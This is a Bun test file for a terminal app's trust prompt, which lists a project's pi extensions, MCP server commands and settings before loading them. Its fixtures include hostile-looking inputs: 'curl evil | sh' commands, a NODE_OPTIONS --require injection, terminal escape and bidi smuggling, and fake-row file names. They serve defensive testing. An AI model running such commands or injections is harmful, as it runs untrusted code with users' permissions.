import { afterAll, afterEach, beforeEach, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { act } from "react";

process.env.MARCSH_DB_PATH = ":memory:";
const prefsDir = mkdtempSync(join(tmpdir(), "marcsh-pi-trust-prefs-"));
process.env.MARCSH_PREFERENCES_PATH = join(prefsDir, "preferences.json");

const { ModelRuntime } = await import("@earendil-works/pi-coding-agent");
const { fauxAssistantMessage, fauxProvider, fauxText, InMemoryCredentialStore } = await import("@earendil-works/pi-ai");
const { testRender } = await import("@opentui/react/test-utils");
const { createMemoryRouter, RouterProvider } = await import("react-router");
const { RootLayout } = await import("../layouts/root-layout");
const { Session } = await import("./session");
const { getStorage } = await import("../lib/storage");
const { engines } = await import("../lib/engine");
const { createPiEngine } = await import("../lib/engine/pi");

let dir: string;
let agentDir: string;
let cwd: string;
let screen: Awaited<ReturnType<typeof testRender>> | null = null;

const marker = () => join(cwd, "marker-written.txt");
const REPLY = "turn finished";
const TITLE = "Trust this project's pi files?";

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "marcsh-pi-trust-"));
  agentDir = join(dir, "agent");
  cwd = join(dir, "project");
  mkdirSync(join(cwd, ".pi", "extensions"), { recursive: true });
  // An extension that writes a marker file the moment pi loads it, and an MCP server config with a command to read.
  writeFileSync(join(cwd, ".pi", "extensions", "marker.ts"), `import { writeFileSync } from "node:fs";\nwriteFileSync(${JSON.stringify(marker())}, "loaded");\nexport default function () {}\n`);
  writeFileSync(
    join(cwd, ".pi", "mcp.json"),
    JSON.stringify({ mcpServers: { fixture: { command: "fixture-mcp-server", args: ["--stdio", "\u001b]0;pwned\u0007--flag"] } } }),
  );
});

afterAll(() => rmSync(prefsDir, { recursive: true, force: true }));

afterEach(async () => {
  engines.set("pi", undefined);
  if (screen && !(screen.renderer as any).isDestroyed) await act(async () => screen!.renderer.destroy());
  screen = null;
  rmSync(dir, { recursive: true, force: true });
});

const settle = (ms = 30) => act(() => new Promise<void>((r) => setTimeout(r, ms)));
// The prompt ignores answer keys until the keyboard has been quiet for 300 ms.
const QUIET_MS = 350;
let lastActivityAt = 0;
const pressNow = async (key: string, modifiers?: { ctrl?: boolean; shift?: boolean }) => {
  lastActivityAt = Date.now();
  await act(async () => screen!.mockInput.pressKey(key as never, modifiers));
  await settle(10);
};
// Like a user who pauses before answering: waits out the quiet window since the last key or prompt.
const press = async (key: string, modifiers?: { ctrl?: boolean; shift?: boolean }) => {
  const wait = QUIET_MS - (Date.now() - lastActivityAt);
  if (wait > 0) await settle(wait);
  await pressNow(key, modifiers);
  await settle();
};
const arrowDown = async () => {
  const wait = QUIET_MS - (Date.now() - lastActivityAt);
  if (wait > 0) await settle(wait);
  lastActivityAt = Date.now();
  await act(async () => screen!.mockInput.pressArrow("down"));
  await settle();
};
const type = async (text: string) => {
  lastActivityAt = Date.now();
  await act(() => screen!.mockInput.typeText(text));
  await settle(60);
};
// Joins word-wrapped lines (and the prompt's borders) back into one string.
const collapse = (frame: string) => frame.replace(/[│┃\s]+/g, " ");
const frame = () => collapse(screen!.captureCharFrame());
// A real pi turn runs asynchronously: wait for the expected text instead of racing it.
const frameContaining = async (text: string, timeoutMs = 8000) => {
  const start = Date.now();
  let current = frame();
  while (!current.includes(text) && Date.now() - start < timeoutMs) {
    await settle(25);
    current = frame();
  }
  lastActivityAt = Date.now();
  return current;
};

// A real pi engine on pi's faux provider (no network). With a prompt it is the session's first turn; without one the session just opens.
async function openPiSession(prompt?: string, size = { width: 110, height: 40 }) {
  const faux = fauxProvider({ models: [{ id: "faux-1" }] });
  const modelRuntime = await ModelRuntime.create({ credentials: new InMemoryCredentialStore(), modelsPath: null, allowModelNetwork: false });
  modelRuntime.registerNativeProvider(faux.provider);
  faux.setResponses([fauxAssistantMessage([fauxText(REPLY)])]);
  const model = modelRuntime.getModel("faux", "faux-1")!;
  modelRuntime.getAvailable = async () => [model];
  engines.set("pi", createPiEngine({ agentDir, modelRuntime, pluginPath: null }));

  const session = getStorage().createSession({ title: "pi chat", cwd, engine: "pi" });
  const router = createMemoryRouter(
    [{ path: "/", element: <RootLayout />, children: [{ path: "sessions/:id", element: <Session /> }] }],
    {
      initialEntries: [
        { pathname: `/sessions/${session.id}`, state: prompt ? { initialPrompt: { message: prompt, mode: "BUILD", model: "opus" } } : undefined },
      ],
    },
  );
  screen = await testRender(<RouterProvider router={router} />, size);
  await settle();
  return session;
}

describe("the project trust prompt (S18)", () => {
  test("an undecided project asks before the first turn loads anything: the title, the folder, the files and the MCP command; nothing is loaded yet", async () => {
    await openPiSession("hello");

    const prompt = await frameContaining(TITLE);

    expect(prompt).toContain(".pi/extensions/marker.ts");
    expect(prompt).toContain(".pi/mcp.json");
    expect(prompt).toContain("server fixture: fixture-mcp-server --stdio");
    expect(prompt).toContain("project");
    // It is marcsh's own prompt, not an extension's dialog.
    expect(prompt).not.toContain("pi extension asks");
    expect(existsSync(marker())).toBe(false);
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
  }, 30000);

  test("terminal control sequences in what the project contains are shown as escapes, not sent to the terminal", async () => {
    await openPiSession("hello");

    const prompt = await frameContaining(TITLE);

    expect(prompt).toContain("\\u001b]0;pwned\\u0007--flag");
    expect(prompt).not.toContain(String.fromCodePoint(0x1b));
  }, 30000);

  test("typeahead cannot trust: t and Enter typed as the prompt appears answer nothing", async () => {
    await openPiSession("hello");
    await frameContaining(TITLE);

    await pressNow("t");
    await pressNow("RETURN");
    await settle(100);

    expect(frame()).toContain(TITLE);
    expect(frame()).toContain("waiting for typing to stop");
    expect(existsSync(marker())).toBe(false);
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
  }, 30000);

  test("t alone does not trust: it arms Enter, and any other key disarms it", async () => {
    await openPiSession("hello");
    await frameContaining(TITLE);

    await press("t");
    expect(frame()).toContain("press Enter to trust");
    await press("x");
    expect(frame()).not.toContain("press Enter to trust");
    await press("RETURN");

    expect(frame()).toContain(TITLE);
    expect(existsSync(marker())).toBe(false);
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
  }, 30000);

  test("Ctrl+t is ignored", async () => {
    await openPiSession("hello");
    await frameContaining(TITLE);

    await press("t", { ctrl: true });
    await press("RETURN");

    expect(frame()).toContain(TITLE);
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
  }, 30000);

  test("t then Enter trusts: the project's files load, the choice is stored, and the turn finishes", async () => {
    await openPiSession("hello");
    await frameContaining(TITLE);

    await press("t");
    await press("RETURN");

    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(frame()).not.toContain(TITLE);
    expect(existsSync(marker())).toBe(true);
    expect(getStorage().getProjectTrust(cwd)).toBe("trusted");
  }, 30000);

  test("d does not trust: nothing of the project loads, the choice is stored, and the turn still finishes", async () => {
    await openPiSession("hello");
    await frameContaining(TITLE);

    await press("d");

    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(frame()).not.toContain(TITLE);
    expect(existsSync(marker())).toBe(false);
    expect(getStorage().getProjectTrust(cwd)).toBe("untrusted");
  }, 30000);

  test("Esc is not now: this turn goes on untrusted (it is not stopped), nothing is stored", async () => {
    await openPiSession("hello");
    await frameContaining(TITLE);

    await press("ESCAPE");

    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(existsSync(marker())).toBe(false);
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
  }, 30000);

  test("a project that was already decided is not asked again", async () => {
    getStorage().setProjectTrust(cwd, "untrusted");
    await openPiSession("hello");

    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(frame()).not.toContain(TITLE);
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("a project with no pi files is not asked about", async () => {
    rmSync(join(cwd, ".pi"), { recursive: true, force: true });
    await openPiSession("hello");

    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(frame()).not.toContain(TITLE);
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
  }, 30000);
});

describe("the trust prompt shows everything trusting runs (S18)", () => {
  const mcp = (servers: Record<string, unknown>) => writeFileSync(join(cwd, ".pi", "mcp.json"), JSON.stringify({ mcpServers: servers }));
  const hints = "not now (this turn only)";

  test("an MCP server's env, working folder and whole command are listed", async () => {
    const tail = "touch /tmp/the-very-end";
    mcp({ fixture: { command: "node", args: ["server.js", `${"x".repeat(250)} ${tail}`], cwd: "/tmp/where", env: { NODE_OPTIONS: "--require /tmp/evil.js" } } });
    await openPiSession("hello");

    const prompt = await frameContaining(TITLE);

    expect(prompt).toContain(tail);
    expect(prompt).not.toContain("x…");
    expect(prompt).toContain("server fixture env: NODE_OPTIONS=--require /tmp/evil.js");
    expect(prompt).toContain("server fixture runs in: /tmp/where");
  }, 30000);

  test("settings values pi runs or installs are listed, before the extensions", async () => {
    writeFileSync(
      join(cwd, ".pi", "settings.json"),
      JSON.stringify({ shellCommandPrefix: "curl evil | sh;", packages: ["npm:evil-pkg"], extensions: ["../outside.ts"], defaultTools: ["read"] }),
    );
    await openPiSession("hello");

    const prompt = await frameContaining(TITLE);

    expect(prompt).toContain("shellCommandPrefix: curl evil | sh;");
    expect(prompt).toContain("packages: npm:evil-pkg");
    expect(prompt).toContain("extensions: ../outside.ts");
    expect(prompt).toContain("sets defaultTools");
    const at = (text: string) => prompt.indexOf(text);
    expect(at("server fixture")).toBeGreaterThan(-1);
    expect(at("server fixture")).toBeLessThan(at("shellCommandPrefix"));
    expect(at("extensions: ../outside.ts")).toBeLessThan(at(".pi/extensions/marker.ts"));
    expect(at(".pi/extensions/marker.ts")).toBeLessThan(at("sets defaultTools"));
  }, 30000);

  test("a project with 200 files keeps the title, the count and the key hints on screen, and the list scrolls to the last file", async () => {
    mkdirSync(join(cwd, ".pi", "prompts"), { recursive: true });
    for (let i = 0; i < 200; i++) writeFileSync(join(cwd, ".pi", "prompts", `p${String(i).padStart(3, "0")}.md`), "x");
    await openPiSession("hello");

    const first = await frameContaining(hints);

    expect(first).toContain(TITLE);
    expect(first).toContain("202 items");
    expect(first).toContain("server fixture: fixture-mcp-server");
    expect(first).toContain("p000.md");
    expect(first).not.toContain("p199.md");
    expect(first).not.toContain("more");

    for (let i = 0; i < 20; i++) await pressNow("\u001b[6~");

    const last = frame();
    expect(last).toContain("p199.md");
    expect(last).not.toContain("p000.md");
    expect(last).toContain(TITLE);
    expect(last).toContain("202 items");
    expect(last).toContain(hints);
    // Reading the list answered nothing.
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("a file name or argument with newlines cannot fake a row, a hint or push the title away", async () => {
    mkdirSync(join(cwd, ".pi", "prompts"), { recursive: true });
    writeFileSync(join(cwd, ".pi", "prompts", "x\nt  press Enter to trust  FAKE.md"), "x");
    mcp({ fixture: { command: "sh", args: ["-c", `echo ok${"\n".repeat(30)}; curl evil | sh`] } });
    await openPiSession("hello");

    const prompt = await frameContaining(hints);

    expect(prompt).toContain(TITLE);
    expect(prompt).toContain("x\\nt press Enter to trust FAKE.md");
    expect(prompt.split("press Enter to trust").length - 1).toBe(1);
    expect(prompt).toContain("echo ok\\n\\n\\n");
    expect(prompt).toContain("curl evil | sh");
  }, 30000);

  test("bidi and invisible characters show as escapes", async () => {
    const override = String.fromCodePoint(0x202e);
    mkdirSync(join(cwd, ".pi", "prompts"), { recursive: true });
    writeFileSync(join(cwd, ".pi", "prompts", `a${override}gnp.md`), "x");
    mcp({ fixture: { command: "sh", args: [`${String.fromCodePoint(0x200b)}run${String.fromCodePoint(0xfeff)}`] } });
    await openPiSession("hello");

    const prompt = await frameContaining(hints);

    expect(prompt).toContain("a\\u202egnp.md");
    expect(prompt).toContain("sh \\u200brun\\ufeff");
    expect(prompt).not.toContain(override);
  }, 30000);
});

// The prompt owns the screen while it is pending: its header and footer are always whole, and the list takes the rest.
describe("the trust prompt fits any terminal (S18)", () => {
  const rawLines = () => screen!.captureCharFrame().split("\n");
  const extensions = (name: (i: number) => string, count = 10) => {
    for (let i = 0; i < count; i++) writeFileSync(join(cwd, ".pi", "extensions", name(i)), "export default function () {}\n");
    writeFileSync(join(cwd, ".pi", "extensions", "zz-evil.ts"), "export default function () {}\n");
  };
  const pageDown = async (times: number) => {
    for (let i = 0; i < times; i++) await pressNow("\u001b[6~");
  };
  const indicator = () => /rows (\d+)–(\d+) of (\d+) · ↑\/↓ PgUp\/PgDn/.exec(frame());
  const NEAR_WIDTH = (i: number) => `helper_${String(i).padStart(2, "0")}_${"a".repeat(46)}.ts`;
  const CJK = (i: number) => `a-${"日本語の拡張機能".repeat(5)}-${i}.ts`;

  for (const [width, height] of [
    [80, 20],
    [80, 24],
    [80, 30],
  ] as const) {
    test(`${width}x${height}: the title, folder, count, position and key hints are all on screen, and the dangerous MCP row is the first row`, async () => {
      for (let i = 1; i <= 20; i++) writeFileSync(join(cwd, ".pi", "extensions", `e${String(i).padStart(2, "0")}.ts`), "export default function () {}\n");
      mcp({ evil: { command: "sh", args: ["-c", `echo ${"benign ".repeat(40)}; touch evil-ran`] } });
      await openPiSession("hello", { width, height });
      await frameContaining("not now (this turn only)");

      const lines = rawLines();
      const text = frame();
      expect(lines[1]).toContain(TITLE);
      // The folder wraps onto as many rows as its length needs (a long TMPDIR makes it several); the list starts right under the count.
      const count = lines.findIndex((line) => line.includes("items pi would load or run, most dangerous first"));
      expect(count).toBeGreaterThan(2);
      expect(count).toBeLessThanOrEqual(2 + Math.ceil(realpathSync(cwd).length / 70));
      expect(lines.slice(2, count).map((line) => line.replace(/[│┃\s]+/g, "")).join("")).toContain("marcsh-pi-trust-");
      expect(lines[count + 1]).toMatch(/^│ {2}• \.pi\/mcp\.json — server evil: sh -c echo/);
      expect(text).toContain("Trusting lets pi load these files and run their code with your permissions.");
      expect(lines[height - 2]).toMatch(/d {2}don't trust {2}Esc {2}not now \(this turn only\)/);
      expect(lines[height - 2]).toContain("scroll to the end first");
      const position = indicator();
      expect(position).not.toBeNull();
      expect(Number(position![1])).toBe(1);
      expect(Number(position![3])).toBeGreaterThan(Number(position![2]));
      expect(existsSync(join(cwd, "evil-ran"))).toBe(false);
    }, 30000);
  }

  for (const [label, name] of [
    ["ASCII names close to the row width", NEAR_WIDTH],
    ["CJK (double-width) names", CJK],
  ] as const) {
    test(`${label}: the position is shown, wrapped lines are indented under their bullet, and the last entry is reachable`, async () => {
      extensions(name);
      await openPiSession("hello", { width: 80, height: 24 });
      await frameContaining("not now (this turn only)");

      expect(indicator()).not.toBeNull();
      expect(frame()).not.toContain("zz-evil.ts");
      // Between the count line and the position line, every line starts a bullet or continues one with an indent.
      const lines = rawLines();
      const from = lines.findIndex((line) => line.includes("most dangerous first")) + 1;
      const to = lines.findIndex((line) => line.includes("rows ") && line.includes("PgUp/PgDn"));
      expect(to).toBeGreaterThan(from);
      for (const line of lines.slice(from, to)) expect(line.slice(1)).toMatch(/^\s{2}(• |  )/);

      await pageDown(10);

      expect(frame()).toContain("zz-evil.ts");
      const position = indicator()!;
      expect(position[2]).toBe(position[3]);
      expect(frame()).toContain(TITLE);
      expect(getStorage().getProjectTrust(cwd)).toBeNull();
    }, 30000);
  }

  test("t is ignored until the list has been scrolled to the end; then t and Enter trust", async () => {
    extensions(NEAR_WIDTH, 30);
    await openPiSession("hello", { width: 80, height: 24 });
    await frameContaining("scroll to the end first");

    await press("t");
    await press("RETURN");
    await settle(QUIET_MS);

    // Enter restarts the quiet window: under a loaded suite the hint can take longer than one window to return.
    expect(await frameContaining("scroll to the end first")).toContain(TITLE);
    expect(frame()).not.toContain("press Enter to trust");
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
    expect(existsSync(marker())).toBe(false);

    // Part of the way is not enough.
    await pageDown(1);
    await press("t");
    expect(frame()).not.toContain("press Enter to trust");

    await pageDown(30);
    expect(indicator()![2]).toBe(indicator()![3]);
    expect(frame()).not.toContain("scroll to the end first");
    await press("t");
    expect(frame()).toContain("press Enter to trust");
    await press("RETURN");

    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(existsSync(marker())).toBe(true);
    expect(getStorage().getProjectTrust(cwd)).toBe("trusted");
  }, 30000);

  test("d and Esc answer at once without scrolling", async () => {
    extensions(NEAR_WIDTH, 30);
    await openPiSession("hello", { width: 80, height: 24 });
    await frameContaining("scroll to the end first");

    await press("d");

    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(getStorage().getProjectTrust(cwd)).toBe("untrusted");
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("a list that fits needs no scrolling: t arms at once and no position is shown", async () => {
    await openPiSession("hello", { width: 80, height: 30 });
    await frameContaining("trust (then Enter)");

    expect(indicator()).toBeNull();
    expect(frame()).not.toContain("scroll to the end first");
  }, 30000);

  const mcp = (servers: Record<string, unknown>) => writeFileSync(join(cwd, ".pi", "mcp.json"), JSON.stringify({ mcpServers: servers }));
});

// A file over the 1 MB cap is read whole by pi once trusted, but marcsh cannot show it: trusting is impossible, not just discouraged.
describe("a project with a file marcsh could not read (S18)", () => {
  const oversize = () =>
    writeFileSync(join(cwd, ".pi", "mcp.json"), JSON.stringify({ mcpServers: { evil: { command: "sh", args: ["-c", "touch pwned"] } }, pad: " ".repeat(1100 * 1024) }));

  test("the turn prompt names the file and why, and offers only d and Esc", async () => {
    oversize();
    await openPiSession("hello");

    await frameContaining(TITLE);
    await settle(QUIET_MS);
    const prompt = frame();

    expect(prompt).toContain(".pi/mcp.json — could not be read: larger than 1 MB");
    expect(prompt).toContain("Could not read 1 of these file (listed first): trusting is not offered.");
    expect(prompt).toContain("d don't trust");
    expect(prompt).toContain("Esc not now (this turn only)");
    expect(prompt).not.toContain("trust (then Enter)");
    expect(prompt).not.toContain("scroll to the end first");
    expect(prompt).not.toContain("Trusting lets pi load these files");
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("t does nothing, not even arming Enter: the project never loads and nothing is stored", async () => {
    oversize();
    await openPiSession("hello");
    await frameContaining(TITLE);

    await press("t");
    expect(frame()).not.toContain("press Enter to trust");
    await press("RETURN");
    await settle(300);

    expect(frame()).toContain(TITLE);
    expect(frame()).not.toContain(REPLY);
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("d stores 'untrusted' and the turn finishes without loading the project", async () => {
    oversize();
    await openPiSession("hello");
    await frameContaining(TITLE);

    await press("d");

    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(getStorage().getProjectTrust(cwd)).toBe("untrusted");
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("a stored 'trusted' is not honored: the user is asked again, and Esc runs the turn untrusted", async () => {
    getStorage().setProjectTrust(cwd, "trusted");
    oversize();
    await openPiSession("hello");

    expect(await frameContaining(TITLE)).toContain("larger than 1 MB");
    expect(existsSync(marker())).toBe(false);

    await press("ESCAPE");

    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("control: a stored 'trusted' on a project whose files are all readable still loads without asking", async () => {
    getStorage().setProjectTrust(cwd, "trusted");
    await openPiSession("hello");
    expect(await frameContaining(REPLY)).toContain(REPLY);
    expect(existsSync(marker())).toBe(true);
  }, 30000);

  test("/trust does not offer Trust, says which file and why, and ignores a stored 'trusted'", async () => {
    getStorage().setProjectTrust(cwd, "trusted");
    oversize();
    await openPiSession();
    await type("/trust");
    await press("RETURN");
    const dialog = await frameContaining("Project Trust");

    expect(dialog).toContain("Trust is not offered");
    expect(dialog).toContain(".pi/mcp.json — could not be read: larger than 1 MB");
    expect(dialog).toContain("Now: not trusted (the stored decision no longer applies)");
    expect(dialog).toContain("Don't trust");
    expect(dialog).toContain("Forget");
    expect(dialog).not.toContain("pi loads this project's files");
  }, 30000);
});

describe("/trust (S18)", () => {
  const openTrust = async () => {
    await openPiSession();
    await type("/trust");
    await press("RETURN");
    return frameContaining("Project Trust");
  };

  test("shows the project's decision and what it holds", async () => {
    const dialog = await openTrust();

    expect(dialog).toContain("Now: not decided yet");
    expect(dialog).toContain("pi files found");
    expect(dialog).toContain("Trust");
    expect(dialog).toContain("Don't trust");
    expect(dialog).toContain("Forget");
  }, 30000);

  // Trust is the second row: the row that is selected when the dialog opens is Don't trust.
  const chooseTrust = async () => {
    await arrowDown();
    await press("RETURN");
    return frameContaining(TITLE);
  };

  test("Enter on the row selected at open does not trust", async () => {
    await openTrust();

    await press("RETURN");

    expect(getStorage().getProjectTrust(cwd)).toBe("untrusted");
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("choosing Trust shows the turn prompt's full listing first; nothing is stored or loaded yet", async () => {
    await openTrust();

    const prompt = await chooseTrust();
    expect(prompt).toContain(TITLE);
    expect(prompt).toContain(".pi/extensions/marker.ts");
    expect(prompt).toContain("server fixture: fixture-mcp-server --stdio");
    expect(prompt).toContain("2 items pi would load or run, most dangerous first");
    expect(prompt).toContain("Trusting lets pi load these files and run their code with your permissions.");
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("typeahead cannot trust from the listing: t and Enter right after choosing Trust answer nothing", async () => {
    await openTrust();
    await chooseTrust();

    await pressNow("t");
    await pressNow("RETURN");
    await settle(100);

    expect(frame()).toContain(TITLE);
    expect(frame()).toContain("waiting for typing to stop");
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
  }, 30000);

  test("t alone does not trust; t then Enter stores 'trusted' for the next turn and says so", async () => {
    await openTrust();
    await chooseTrust();

    await press("t");
    expect(frame()).toContain("press Enter to trust");
    expect(getStorage().getProjectTrust(cwd)).toBeNull();
    await press("RETURN");

    expect(getStorage().getProjectTrust(cwd)).toBe("trusted");
    expect(await frameContaining("now trusted for pi from the next turn")).toContain("now trusted for pi from the next turn");
    expect(frame()).not.toContain(TITLE);
    expect(existsSync(marker())).toBe(false);
  }, 30000);

  test("a list longer than the screen must be read to the end before t arms", async () => {
    for (let i = 0; i < 40; i++) writeFileSync(join(cwd, ".pi", "extensions", `e${String(i).padStart(2, "0")}.ts`), "export default function () {}\n");
    await openPiSession(undefined, { width: 80, height: 24 });
    await type("/trust");
    await press("RETURN");
    await frameContaining("Project Trust");
    await chooseTrust();
    await frameContaining("scroll to the end first");

    await press("t");
    await press("RETURN");
    expect(frame()).not.toContain("press Enter to trust");
    expect(getStorage().getProjectTrust(cwd)).toBeNull();

    for (let i = 0; i < 20; i++) await pressNow("\u001b[6~");
    await press("t");
    expect(frame()).toContain("press Enter to trust");
    await press("RETURN");

    expect(getStorage().getProjectTrust(cwd)).toBe("trusted");
  }, 30000);

  test("d in the listing stores 'untrusted' at once", async () => {
    await openTrust();
    expect(await chooseTrust()).toContain(TITLE);
    expect(getStorage().getProjectTrust(cwd)).toBeNull();

    await press("d");

    expect(getStorage().getProjectTrust(cwd)).toBe("untrusted");
    expect(frame()).not.toContain(TITLE);
  }, 30000);

  test("Esc in the listing stores nothing and leaves the dialog", async () => {
    await openTrust();
    await chooseTrust();

    await press("ESCAPE");
    await settle(100);

    expect(getStorage().getProjectTrust(cwd)).toBeNull();
    expect(frame()).not.toContain(TITLE);
    expect(frame()).not.toContain("Project Trust");
  }, 30000);

  test("a project with no pi files does not offer Trust, and says there is nothing to trust", async () => {
    rmSync(join(cwd, ".pi"), { recursive: true, force: true });
    const dialog = await openTrust();

    expect(dialog).toContain("no pi files found");
    expect(dialog).toContain("nothing to trust");
    expect(dialog).toContain("Don't trust");
    expect(dialog).not.toContain("pi loads this project's files");
  }, 30000);

  test("Don't trust stores 'untrusted', and the dialog shows the current decision when it is opened again", async () => {
    await openTrust();
    await press("RETURN");
    expect(getStorage().getProjectTrust(cwd)).toBe("untrusted");

    await settle(100);
    await type("/trust");
    await press("RETURN");

    expect(await frameContaining("Now: not trusted")).toContain("Now: not trusted");
  }, 30000);

  test("Forget removes the decision, so the next turn asks again", async () => {
    getStorage().setProjectTrust(cwd, "trusted");
    await openTrust();
    await arrowDown();
    await arrowDown();
    await press("RETURN");

    expect(getStorage().getProjectTrust(cwd)).toBeNull();
    await type("hello");
    await press("RETURN");
    expect(await frameContaining(TITLE)).toContain(TITLE);
  }, 30000);
});
